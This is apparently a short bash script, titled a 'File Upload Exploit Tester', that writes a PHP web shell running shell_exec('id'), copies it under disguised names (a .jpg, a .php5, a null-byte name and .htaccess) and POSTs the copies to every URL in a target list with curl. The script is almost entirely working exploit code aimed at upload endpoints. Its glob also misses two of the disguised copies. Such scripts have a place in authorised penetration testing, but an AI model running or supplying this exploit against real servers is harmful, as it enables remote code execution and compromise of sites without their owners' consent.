#!/bin/bash
echo " File Upload Exploit Tester"

mkdir -p upload_results

if [[ ! -f upload_targets.txt ]]; then
  echo "Missing upload_targets.txt. Provide upload URLs (POST endpoints)."
  exit 1
fi

cat <<EOF > malicious.php
<?php echo '[OK] ' . shell_exec('id'); ?>
EOF

# Rename with multiple disguises
cp malicious.php malicious.jpg
cp malicious.php malicious.php5
cp malicious.php shell.ph%00p
cp malicious.php .htaccess

for url in $(cat upload_targets.txt); do
  echo "[*] Target: $url"
  for file in malicious.*; do
    echo "  [+] Uploading: $file"
    curl -s -X POST -F "file=@$file" "$url" >> upload_results/${file}_to_$(echo $url | md5sum | cut -d' ' -f1).txt
  done
done

echo "File upload tests completed. Check 'upload_results/'"
